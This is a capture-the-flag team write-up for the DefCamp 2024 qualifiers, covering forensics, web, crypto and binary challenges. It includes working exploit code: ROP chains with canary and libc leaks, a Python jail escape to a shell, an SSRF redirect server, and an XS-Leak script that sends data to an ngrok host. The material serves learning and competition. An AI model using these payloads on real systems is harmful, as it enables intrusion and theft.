### DefCamp CTF 2024 Quals
**Team:** > r0/dev/null\
**Country:** Romania

---

#### Alternating
**Proof of flag**  
![Flag Screenshot](https://i.imgur.com/wkSKO5M.png)  
`ctf{7ce5567830a2f9f8ce8a7e39856adfe5208242f6bce01ca9af1a230637d65a2d}`

**Summary of the vulnerabilities identified**  
This challenge leveraged Alternate Data Streams (ADS) on the NTFS file system, hiding the real flag within a stream attached to a visible file.

**Proof of solving**  
Upon opening the provided RAR file in VS Code’s hex editor, I noticed a reference to `:real_flag.txt`. This indicated the use of ADS, a feature in NTFS that allows data to be hidden within files. Running the command `more < Flag.txt.txt:real_flag.txt>` revealed the hidden flag.

![Alt Text](https://i.imgur.com/hbIqvr8.png)
![Alt Text](https://i.imgur.com/wkSKO5M.png)

---

#### forensics-disk
**Proof of flag**  
![Alt Text](https://i.imgur.com/mAZGVoI.png)
![Flag Screenshot](https://i.imgur.com/sGbOK2t.png)  
`CTF{232293r-32dcvg33-beskdkfe}`

**Summary of the vulnerabilities identified**  
The challenge focused on extracting hidden JPEG files from raw disk images. The files contained embedded JPEG data, leading to the discovery of the flag.

**Proof of solving**  
The challenge provided three `.img` files, which I analyzed for hidden data. Using a Python script to search for JPEG start markers (`FF D8`), I was able to extract the hidden JPEGs from the disk images. The flag was found within these extracted images, in parts.

```py
import random
def extract_jpegs_from_img(img_file):
    start_marker = b'\xFF\xD8'  # Start of JPEG
    with open(img_file, 'rb') as f:
        content = f.read()
        start_idx = 0
        while True:
            start_idx = content.find(start_marker, start_idx)
            if start_idx == -1:
                break
            next_start_idx = content.find(start_marker, start_idx + 2)
            jpeg_data = content[start_idx:] if next_start_idx == -1 else content[start_idx:next_start_idx]
            output_filename = f"e_{random.randint(1000, 9999)}.jpg"
            with open(output_filename, 'wb') as jpeg_file:
                jpeg_file.write(jpeg_data)
            start_idx = next_start_idx

extract_jpegs_from_img("new_1.img")
extract_jpegs_from_img("new_2.img")
extract_jpegs_from_img("new_3.img")
```

---

#### rerdp
**Proof of flag**  
![Flag Screenshot](https://i.imgur.com/qQ1KDzz.png)  
`ctf{1eaa9d65d69a92b75e6cbc68ea78e346ad0452b1a2931aba4a530ee1a3f04dad}`

**Summary of the vulnerabilities identified**  
The challenge involved analyzing RDP traffic captured in a pcap file. By extracting TLS keys and using them to decrypt the RDP session, I was able to recover the flag.

**Proof of solving**  
The first HTTP post packet in the pcap file contained an embedded pcap, and the second HTTP post packet included TLS keys. Using the `pyrdp` tool from GoSecure, I decrypted the session and reconstructed the actions. By converting the traffic to OSI Layer 7 and using the tool, I generated a video of the session, which revealed a Windows 11 machine accessing a GitHub Gist. The flag was displayed in this session and subsequently written to a text file.

![Alt Text](https://i.imgur.com/qQ1KDzz.png)

---

#### siem-logs
**Proof of flag**  
![Flag Screenshot](https://i.imgur.com/LzuleWR.png)  
- Malicious IP: `103.53.43.239`  
- Malicious Domain: `studentvisaconsultantsdelhi`  
- CMS Exploited: `WordPress`

**Summary of the vulnerabilities identified**  
The challenge required analyzing SIEM logs to uncover a malicious domain and determine the CMS used in an attack. The domain `studentvisaconsultantsdelhi` was identified as malicious, and WordPress was the CMS exploited.

**Proof of solving**  
I used Kibana to filter the `siem-logs2*` dataset from 2017 onwards. By searching through the `hosts` field and with the second question as a hint that I should look for student-related domains, I identified the domain `studentvisaconsultantsdelhi`. By filtering for that domain, I then discovered that the attackers exploited the `/wp-login.php` endpoint of a WordPress installation. The malicious IP associated with this domain was `103.53.43.239`.

![Alt Text](https://i.imgur.com/afWBa2Y.png)
![Alt Text](https://i.imgur.com/LzuleWR.png)

---

#### production-bay
**Proof of flag**  
![Flag Screenshot](https://i.imgur.com/QVR6Gb9.png)  
`ctf{89b52b00fd39c0410372b898632e6bf0648ae9f43d500762d03af9e7768bcbfd}`

**Summary of the vulnerabilities identified**  
This challenge exploited misconfigured API endpoints, where manipulating HTTP headers allowed access to bypass localhost requirements, obtaining the flag.

**Proof of solving**  
On the main page, when generating a cat, we can notice a request to the `/api/data/cat` endpoint. We visit `/api/data` route and, from there, access a `/debug` endpoint. By adding the query parameter `?host=localhost:5000`, we were redirected to the original cat generator. The flag route required using `localhost:5000` as the host. However, the request's host was set to `:5000`, preventing access. To bypass this, I set the host to my `webhook.site` url and observed the `x-original-host` header, which was identical to the request.host plus the `5000` port. I manually modified this header using Burp Suite to `localhost`, which revealed the flag.

![Alt Text](https://i.imgur.com/8ZllIJ3.png)
![Alt Text](https://i.imgur.com/y2VrD6a.png)
![Alt Text](https://i.imgur.com/QVR6Gb9.png)

### noogle
**Proof of flag**
![Flag Screenshot](https://i.imgur.com/4NoUEki.png)
`CTF{9cf16d163cbaecc592ca40bee3de4b1626ee0f4a3b3db23cbd5ad921049ebc0f}`

**Summary of the vulnerabilities identified**
SSRF leaking localhost through Google’s `/amp/s/<url>` endpoint, which allows redirection despite restricting the links to `https://www.google.com/`.

**Proof of solving**
You could only send links starting with `https://www.google.com/` to `/api/getLinks`, but the `amp/s/<url>` endpoint on Google allowed instant redirection, which enabled the SSRF attack. Using the below Python code, I set up a local HTTP server to exploit this SSRF vulnerability by redirecting the bot to `localhost`.

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("""
Usage: {} <port_number> <url>
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):

      print(self.headers)
      self.send_response(302)
      self.send_header('Location', sys.argv[2])
      self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

Screenshots of the attack and result:
![Redirect Setup](https://i.imgur.com/4NoUEki.png)
![Localhost SSRF](https://i.imgur.com/EY90Hng.png)

---

### oracle-srl
**Proof of flag**
![Flag Screenshot](https://i.imgur.com/IP9NE9C.png)
`CTF{e663b007e3d1fd27f657e2756e3ba8724a37119d145063ce541595988b6cdc72}`

**Summary of the vulnerabilities identified**
The flag was leaked in the source code of `/Oracle-SRL/client/client.go`.

**Proof of solving**
After inspecting the code repository, I found the flag hardcoded within the client file. A simple search through the source code revealed the flag.
![Source Code Flag Leak](https://i.imgur.com/IP9NE9C.png)

---

### reelfreaks
**Proof of flag**
![Flag Screenshot](https://i.imgur.com/UBao3Y2.png)
`DCTF{l3ak_ev3ry_d4y_0f_ev3ry_w33k}`

**Summary of the vulnerabilities identified**
XS-Leak through timing attacks on the search functionality, used to retrieve contents of the `/watchlist` endpoint indirectly via the bot's page visit.

**Proof of solving**
The bot visited any page on any website, but there was no direct XSS on the challenge site. By telling the bot to visit my crafted page, I measured the time it took to load different search queries from `/watchlist`. By optimizing the search function to avoid case sensitivity and using a reduced keyset, I efficiently filtered the correct flag characters. Here’s the attack code that conducted this XS-Leak:

```js
(async() => {
const keyset = "0123456789abcdefghijklmnopqrstuvwxyz_}";

for (let i = 0; i < keyset.length; i++) {
	const input = "ctf{l3ak_ev3ry_d4y_0f_ev3ry_w33k";
	let guess = keyset[i];

	const iframe = document.createElement("iframe");
	iframe.src = "https://127.0.0.1:5000/watchlist?q=" + input + guess;
	iframe.width = 1000;
	iframe.height = 1000;
	iframe.id = "easy";

	iframe.addEventListener("load", function() {
	  const end = Date.now();
	  console.log(`Execution time: ${end - start} ms`);
	  fetch(`https://1861-82-76-226-189.ngrok-free.app/?time=__${end - start}__&input=__${input + guess}__`)
	});

	const start = Date.now();
	document.body.appendChild(iframe);
	await new Promise(r => setTimeout(r, 500)); // sleep

}
})();
```

Screenshot of the XS-Leak:
![XS-Leak Screenshot](https://i.imgur.com/UBao3Y2.png)

---

### ctr
**Proof of flag**
![Flag Screenshot](https://i.imgur.com/dAkCQdI.png)
`CTF{d6bd1954527310f3f831baa46582f553a9e780d8fa747637d25da1281c24edaf}`

**Summary of the vulnerabilities identified**
Bruteforce attack against the counter values in a CTR mode encryption, by exploiting the server's fixed starting counter.

**Proof of solving**
The server used a fixed counter value which incremented with every sent text. I brute-forced the counter values by XORing with the resulting text until I found the values that decrypted the content of `ctr.txt` into ASCII. Initially, I only decrypted one line by matching it linearly, but by adjusting the brute-force to consider more XOR keys, I was able to extract the entire flag.

```python
from pwn import *

def is_ascii(s):
    return all(ord(c) < 128 for c in s)

lines = open("ctr.txt").readlines()

io = remote("35.246.144.124", 31245)
io.recvline()

keys = []
for i in range(128):
	io.sendline(b"\x00"*16)
	out = io.recvline()
	out = out.split(b" ")[-1].strip()
	print("out:",out)
	a = xor(bytes.fromhex(out.decode()), b"\x00"*16)
	keys.append(a)
	io.clean(timeout=0.2)
io.close()

flag = ""
for x in range(69):
	for j in range(128):
		result = xor(bytes.fromhex(lines[x].strip()), keys[j])
		try:
			if is_ascii(result.decode()):
				print("xor:",result, j)
				flag += chr(j+1)
				break
		except Exception as e:
			pass
print("flag:",flag)
```

---

### call-me-pliz
**Proof of flag**
`CTF{89c5cce663fce1500d22c2ef5112dc2885c491d37d3503118251bdd516b4dcc0}`

**Summary of the vulnerabilities identified**
In this challenge, we analyzed a `logs.txt` file containing various logs to identify specific pieces of information related to a keylogger's activity. We successfully extracted a password, a malicious IP address, and a protection feature the malware attempted to disable.

**Proof of solving**
1. **Q1 - Password Obtained by the Malware Keylogger**:
   - We searched for the keyword `password` in the logs.
   - Result: `SuperSecureP@ssw0rd`
   - Log entry: `09-15 12:34:42.890  1135  1145 E AnubisKeylogger: Captured password input: 'SuperSecureP@ssw0rd'`

2. **Q2 - Malicious IP Used in C2**:
   - We searched for the keyword `C2` in the logs.
   - Result: `95.173.136.70`
   - Log entries:
     ```
     09-15 12:34:07.234  1223  1254 W AnubisMalware: Command & Control communication established with 95.173.136.70
     09-15 12:34:08.456  1135  1136 I Chrome: Page load finished https://banking-app.com/login
     ```


3. **Q3 - Protection the Malware Activity Tried to Disable**:
   - We searched for the keyword `protect` in the logs.
   - Result: `Google Play Protect`
   - Log entry: `09-15 12:34:38.123  1223  1245 E AnubisMalware: Attempting to disable Google Play Protect`

---

### i-got-a-virus
**Proof of flag**

**Flag:** `CTF{edfb2325d134f8500dfc670df26961164628780bf2dbd66f7929c65ea79cb59d}`

**Summary of the vulnerabilities identified**
We analyzed a virus sample by utilizing VirusTotal, where we extracted critical details including the SHA256 hash of the file, malware family, type, creation date, and associated malicious IP addresses.

**Proof of solving**
1. **Q1 - SHA256 of the File**:
   - Result: `4c1dc737915d76b7ce579abddaba74ead6fdb5b519a1ea45308b8c49b950655c`
   - Found in the details section by searching for `sha256`.

2. **Q2 - Malware Family**:
   - Result: `petya`
   - Found by searching for `Family` in the results.

3. **Q3 - Malware Type**:
   - Result: `trojan`
   - Identified by checking `Threat categories`.

4. **Q4 - Creation Date of the Malicious File**:
   - Result: `2016-01-30 02:56:43 UTC`
   - Found by searching for `creation date` in the details section.

5. **Q5 - Malicious IP**:
   - Result: `13.107.4.52`
   - Found in the relations section among a list of IPs.

---

### SherloKHolmes
**Proof of flag**
`CTF{edfb2325d134f8500dfc670df26961164628780bf2dbd66f7929c65ea79cb59d}`

**Summary of the vulnerabilities identified**
The challenge involved decoding clues from a story that led to the identification of specific coordinates and required linking them to their respective cities to find the hidden flag.

**Proof of solving**
1. **Clue Analysis**:
   - Investigated the username `SherloKHolmes` using the Sherlock tool, which yielded a GitLab account containing relevant information.

2. **Python Script Extraction**:
   - Found coordinates in a Python script on the GitLab repository.

3. **Coordinate Decoding**:
   - Decoded the coordinates and matched them to their respective city names.
   - Resulting string: `CTFXMAPDCTF`

4. **Final Step**:
   - The decoded string was used as a key on the server to unlock the flag.

---

### conv

**Proof of flag**
`CTF{89c5cce663fce1500d22c2ef5112dc2885c491d37d3503118251bdd516b4dcc0}`

**Summary of the vulnerabilities identified**
The challenge involved reversing a convolution operation implemented in Python to extract the original plaintext containing the flag. The provided ciphertext and key were essential for reconstructing the plaintext byte-by-byte.

**Proof of solving**
1. **Understanding the Convolution**:
   - Analyzed the provided convolution function, which combined the bytes of the plaintext and key arrays through multiplication and summation.

2. **Key and Ciphertext Identification**:
   - Utilized the given key and ciphertext in hex format for the decryption process.

3. **Reverse Engineering**:
   - Implemented a brute-force approach to guess each byte of the plaintext, reconstructing the expected ciphertext through the convolution operation.

4. **Final Implementation**:
   - Executed the reversal script to derive the plaintext, which revealed the flag embedded within the message.

```python
def reverse_convolution(ciphertext, key, plaintext_len):
    len1, len2 = plaintext_len, len(key)
    plaintext = [0] * len1

    for i in range(len1):
        for b in range(256):  # Try each byte value for plaintext
            plaintext[i] = b
            res = [0] * (len1 + len2 - 1)

            # Perform convolution
            for j in range(i + len2):
                csum = 0
                for k in range(max(0, j - len2 + 1), min(i + 1, j + 1)):
                    csum += plaintext[k] * key[j - k]
                res[j] = csum % 256

            # Check if this byte matches the ciphertext
            if res[i] == ciphertext[i]:
                break  # If correct, move to next byte

    return bytes(plaintext)

# Recover the plaintext
plaintext_len = len(ciphertext) - len(key) + 1
plain1_recovered = reverse_convolution(ciphertext, key, plaintext_len)
print(plain1_recovered.decode('ascii'))
```

By executing the script, the original plaintext and flag were successfully recovered:

```
Elit cybernetica fusce stratagemata enigma penetratio exsertus.
CTF{89c5cce663fce1500d22c2ef5112dc2885c491d37d3503118251bdd516b4dcc0}
Combinatio complexus networkus quantum facilis vectura obfuscatus.
Latitudo cripto diversus et preditus, securitas hexadecimale detectus phantasma scriptum.
Insidiae infiltratio breviaria kernel status, protus obscura administratio.
```

---

### PyTerm
**Proof of flag**
`CTF{c54f60751af79f92fd93a3a2f78eb2461e8ce614c879a1bb85fb1c0e32bd7ec3}`

**Summary of the vulnerabilities identified**
The challenge involved exploiting a blind Python jail vulnerability using a Unicode bypass to execute a shell command from within the restricted environment.

**Proof of solving**
1. **Initial Payload Creation**:
   - Crafted a payload using the `breakpoint()` function to gain access to the shell environment.

2. **Execution of Command**:
   - The payload was structured as `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵(), then import os; os.system("sh")`, allowing shell access.

3. **Verification**:
   - The payload was successfully executed, leading to the retrieval of the flag.

---

### Buy Coffee
**Proof of flag**
`CTF{b5d4efc30c05420acb161eb92e120a902187d9710b297fba36d42528ea4ae09d}`

**Summary of the vulnerabilities identified**
The challenge included a stack canary protection, which could be leaked using a printf format vulnerability. A subsequent libc leak allowed for the calculation of the libc base, while a final buffer overflow in the `fread` call enabled the writing of a ROP payload.

**Proof of solving**
1. **Stack Canary Leak**:
   - Leaked the canary using a formatted input with `printf`.

2. **Libc Leak**:
   - Retrieved the libc leak to calculate the base address.

3. **Payload Construction**:
   - Created a payload to exploit the buffer overflow, incorporating the leaked canary and ROP chain.

```python
from pwn import *

elf = context.binary = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")

r = remote("34.141.5.94", 30177)
r.sendlineafter(b"\n$ ", b"%9$p")
canary = int(r.recv(18).decode()[2:], 16)
print(hex(canary))
leak = int(r.recvline().split(b" ")[-1].strip().decode()[2:], 16)
print(hex(leak))
libc.address = leak - libc.sym["printf"]
print(hex(libc.address))
payload = b"a" * 24
payload += p64(canary)
payload += b"a" * 8
payload += p64(libc.address + 0x23b6a)
payload += p64(libc.address + 0x1b45bd)
payload += p64(libc.address + 0x22679)
payload += p64(libc.sym["system"])
r.sendafter(b"\n$ ", payload)
r.send(b"a" * 8)  # to finish fread
r.interactive()
```

---

### aptssh
**Proof of flag**
`ctf{ba1e7756b2a842641357e840b47a477924b8deb0078e715754247453abb587be}`

**Summary of the vulnerabilities identified**
The challenge involved connecting to an SSH server using credentials that triggered a backdoor when the password exceeded 100 characters. The backdoor could be exploited by providing a specific payload.

**Proof of solving**
1. **SSH Connection**:
   - Attempted to connect using the credentials `aptssh:aptssh`, triggering the backdoor.

2. **Payload Creation**:
   - Created a payload that satisfied the backdoor conditions, appending a specific byte sequence.

```python
import pexpect

ssh_host = "34.159.156.124"
ssh_port = 32487
username = "sshuser"
payload = (
    b"a" * 100 +
    b"\xc3\x9e\xc2\xad\xc2\xbe\xc3\xaf"
)

child = pexpect.spawn(f"ssh -p {ssh_port} {username}@{ssh_host}")
child.expect("d:")
child.sendline(payload)
print(child.before.decode("utf-8"))
child.interact()
```

---

### Mobisec
**Proof of flag**
`CTF{77cd55d22ef0d516a45ed0e238fbc5dbc4c93b0824047ea3e0a0509a5a9735ac}`

**Summary of the vulnerabilities identified**
The challenge required exploiting UUIDs to leak hashed passwords and ciphertexts, followed by brute-forcing the passwords. The decryption process involved using PBKDF2 and AES-GCM to retrieve the final flag.

**Proof of solving**
1. **UUID Discovery**:
   - Utilized `wordlist.txt` to identify valid UUIDs.

2. **API Requests**:
   - Made requests to obtain hashed passwords and ciphertexts for each UUID.

3. **Password Cracking**:
   - Employed Hashcat to crack the password hashes.

4. **Decryption**:
   - Developed a Python function to decrypt the ciphertexts using the derived keys.

```python
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from base64 import b64decode

data = b64decode("46xPFEfuu5Lk1WFBqjeFbhWpbI7PmR/BzllqefGm/ocmD1WHAEZhrM3quZ3eb8tyqYu1zrD5xkO55QtYzZvvI2BkpVfKGQGbLiQ2TQKUxK6dSPIvQKQqtd39pxLOBU8Gcat5drU=")  # longest ciphertext
passw = "SHALLOWgrounds13"  # corresponding password
key = PBKDF2(passw, "0123456789abcdef", dkLen=32, count=100000)
nonce, tag, ct = data[:16], data[16:32], data[32:]
cipher = AES.new(key, AES.MODE_GCM, nonce)
print(cipher.decrypt_and_verify(ct, tag))
```

---

### ftp-console
**Proof of flag**
`CTF{093f6a8964db7d3c07e9eed18179cc35a22ae1d96dfa18a295beb7bcfa05fd7f}`

**Summary of the vulnerabilities identified**
The challenge involved exploiting a binary to leak memory addresses, allowing the calculation of the libc base for crafting a ROP payload. The libc version was identified using a leak from the remote instance.

**Proof of solving**
1. **Memory Leak**:
   - Connected to the binary and extracted a leak to calculate the libc base.

2. **ROP Payload Construction**:
   - Developed a ROP payload based on the leaked address and offset for the `system` function.

```python
from pwn import *

r = remote("34.107.40.88", 31124)
elf = context.binary = ELF("./ftp")
libc = ELF("./libc6_2.35-0ubuntu3.7_i386.so")
r.sendlineafter(b"USER ", b"a")
leak = r.recv().split(b" ")[-2].split(b"\n")[0]
leak = int(leak.decode()[2:], 16)
libc.address = leak - libc.sym["system"]
payload = b"a" * 80
payload += p32(libc.sym["system"])
payload += p32(0)
payload += p32(libc.address + 0x1bd0d5)
r.sendline(payload)
r.interactive()
```